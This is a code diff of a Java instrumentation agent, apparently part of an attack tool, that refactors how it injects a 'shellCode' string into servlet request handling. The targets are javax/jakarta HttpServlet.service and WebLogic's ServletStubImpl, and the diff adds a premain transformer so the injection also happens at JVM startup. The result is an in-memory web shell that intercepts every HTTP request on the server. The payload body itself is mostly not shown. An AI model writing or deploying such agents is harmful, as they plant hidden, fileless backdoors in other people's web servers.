@@ -6,7 +6,10 @@ import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtMethod;
 import java.lang.instrument.ClassDefinition;
+import java.lang.instrument.ClassFileTransformer;
+import java.lang.instrument.IllegalClassFormatException;
 import java.lang.instrument.Instrumentation;
+import java.security.ProtectionDomain;
 import java.util.*;
 
 public class AgentMain {
@@ -32,9 +35,66 @@ public class AgentMain {
             "return;\n"+
             "}catch(Exception ignored){}}\n";
 
+
     public static void agentmain(String agentArgs, Instrumentation ins) {
-        System.out.println("I");
+        System.out.println("agentmain");
         Class[] cLasses = ins.getAllLoadedClasses();
+        Map targetClasses = targetClasses();
+        for (Class cls : cLasses) {
+            if (targetClasses.containsKey(cls.getName())) {
+                String targetClassName = cls.getName();
+                try {
+                    byte[] data = getbyte(targetClassName,targetClasses,cls);
+                    ins.redefineClasses(new ClassDefinition(cls, data));
+                } catch (Exception e){
+                    e.printStackTrace();
+                }
+            }
+        }
+    }
+
+    public static void premain(String agentArgs, Instrumentation inst) {
+        System.out.println("premain");
+        inst.addTransformer(new DefineTransformer(), true);
+    }
+
+    static class DefineTransformer implements ClassFileTransformer {
+        @Override
+        public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
+            Map targetClasses = targetClasses();
+            if (targetClasses.containsKey(className.replace("/", "."))) {
+                try {
+                    return getbyte(className, targetClasses, classBeingRedefined);
+                } catch (Exception ignored) {
+                }
+            }
+            return classfileBuffer;
+        }
+    }
+
+    public static byte[] getbyte(String targetClassName,Map targetClasses,Class cls) throws Exception{
+        ClassPool cPool = ClassPool.getDefault();
+        if (targetClassName.equals("jakarta.servlet.http.HttpServlet")) {
+            shellCode = shellCode.replace("javax.servlet", "jakarta.servlet");
+        }
+        ClassClassPath classPath = new ClassClassPath(cls);
+        cPool.insertClassPath(classPath);
+        List paramClsList = new ArrayList();
+        Iterator var17 = ((List) ((Map) targetClasses.get(targetClassName)).get("paramList")).iterator();
+        String methodName;
+        while (var17.hasNext()) {
+            methodName = (String) var17.next();
+            paramClsList.add(cPool.get(methodName));
+        }
+        CtClass cClass = cPool.get(targetClassName);
+        methodName = ((Map) targetClasses.get(targetClassName)).get("methodName").toString();
+        CtMethod cMethod = cClass.getDeclaredMethod(methodName, (CtClass[]) paramClsList.toArray(new CtClass[paramClsList.size()]));
+        cMethod.insertBefore(shellCode);
+        cClass.detach();
+        return cClass.toBytecode();
+    }
+
+    public static Map targetClasses() {
         Map targetClasses = new HashMap();
         Map targetClassJavaxMap = new HashMap();
         targetClassJavaxMap.put("methodName", "service");
@@ -51,7 +111,6 @@ public class AgentMain {
         targetClassJakartaMap.put("paramList", paramJakartaClsStrList);
         targetClasses.put("javax.servlet.http.HttpServlet", targetClassJavaxMap);
         targetClasses.put("jakarta.servlet.http.HttpServlet", targetClassJakartaMap);
-        ClassPool cPool = ClassPool.getDefault();
         if (ServerDetector.isWebLogic()) {
             targetClasses.clear();
             Map targetClassWeblogicMap = new HashMap();
@@ -62,37 +121,6 @@ public class AgentMain {
             targetClassWeblogicMap.put("paramList", paramWeblogicClsStrList);
             targetClasses.put("weblogic.servlet.internal.ServletStubImpl", targetClassWeblogicMap);
         }
-
-        for (Class cls : cLasses) {
-            if (targetClasses.containsKey(cls.getName())) {
-                String targetClassName = cls.getName();
-                try {
-                    if (targetClassName.equals("jakarta.servlet.http.HttpServlet")) {
-                        shellCode = shellCode.replace("javax.servlet", "jakarta.servlet");
-                    }
-                    ClassClassPath classPath = new ClassClassPath(cls);
-                    cPool.insertClassPath(classPath);
-                    cPool.importPackage("java.lang.reflect.Method");
-                    cPool.importPackage("javax.crypto.Cipher");
-                    List paramClsList = new ArrayList();
-                    Iterator var17 = ((List) ((Map) targetClasses.get(targetClassName)).get("paramList")).iterator();
-                    String methodName;
-                    while (var17.hasNext()) {
-                        methodName = (String) var17.next();
-                        paramClsList.add(cPool.get(methodName));
-                    }
-                    CtClass cClass = cPool.get(targetClassName);
-                    methodName = ((Map) targetClasses.get(targetClassName)).get("methodName").toString();
-                    CtMethod cMethod = cClass.getDeclaredMethod(methodName, (CtClass[]) paramClsList.toArray(new CtClass[paramClsList.size()]));
-                    cMethod.insertBefore(shellCode);
-                    cClass.detach();
-                    byte[] data = cClass.toBytecode();
-                    ins.redefineClasses(new ClassDefinition(cls, data));
-                } catch (Exception e) {
-                    e.printStackTrace();
-                }
-            }
-        }
-
+        return targetClasses;
     }
 }
